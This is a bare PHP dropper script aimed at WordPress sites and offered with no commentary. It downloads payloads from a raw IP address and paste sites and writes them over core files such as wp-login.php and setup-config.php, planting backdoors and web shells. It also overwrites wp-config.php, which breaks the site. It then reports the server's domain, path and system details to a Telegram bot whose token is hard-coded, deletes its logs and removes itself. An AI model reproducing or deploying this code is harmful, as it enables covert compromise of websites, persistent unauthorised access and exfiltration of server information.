<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/ID3/index.php" ;
$text = http_get('http://91.121.68.60/m.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/maint/lock360.phTML" ;
$text = http_get('http://91.121.68.60/m.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/radio.php" ;
$text = http_get('http://91.121.68.60/radio.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/plugin-install.php" ;
$text = http_get('https://pastebin.com/raw/p4yCFJrg');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/setup-config.php" ;
$text = http_get('https://pastebin.com/raw/p4yCFJrg');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-login.php" ;
$text = http_get('http://paste.greatfraud.com/raw/5njuKkyiS');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "wp-login.php";
$check =$filedir.$filenames;
$text = http_get('http://paste.greatfraud.com/raw/5njuKkyiS');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-admin/setup-config.php";
$check =$filedir.$filenames;
$text = http_get('http://paste.greatfraud.com/raw/p27wjEvTA');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-config.php";
$check =$filedir.$filenames;
$text = http_get('http://raw.githubusercontent.com/WordPress/WordPress/master/wp-config-sample.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><h1>GOGOGOGGOOOOO8889</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] '; system('rm error_log'); $sys = php_uname(); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1522731867:AAHdtsErHFGWOXhIVCfzMhz8xxUWKiH96Hs"; $data = [ 'chat_id' => '1179830888', 'text' => "DASH WORKER : \r\n http://$domen/$tempat \r\n $sys \r\n $home  \n$passpost " ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
unlink('error_log');
unlink(__FILE__);